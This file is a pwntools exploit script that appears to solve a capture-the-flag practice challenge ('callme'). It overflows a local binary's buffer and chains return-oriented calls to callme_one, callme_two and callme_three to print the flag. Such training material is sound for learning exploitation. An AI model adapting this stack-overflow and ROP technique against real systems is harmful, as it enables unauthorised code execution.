#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('callme')
context(arch='amd64',os='linux')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

one = 0xdeadbeefdeadbeef
two = 0xcafebabecafebabe
three = 0xd00df00dd00df00d
rop = ROP(exe)
buf= ''

rop.call('callme_one', [one,two,three])
rop.call('callme_two', [one,two,three])
rop.call('callme_three', [one,two,three])

buf += b'A' * (cyclic_find('laaa')-4) # sub by 4 - how to set amd64 context XD
buf += rop.chain()

log.info(rop.dump())

io.recvuntil('> ')
io.sendline(buf)
log.success('flag: %s' % io.recvall())



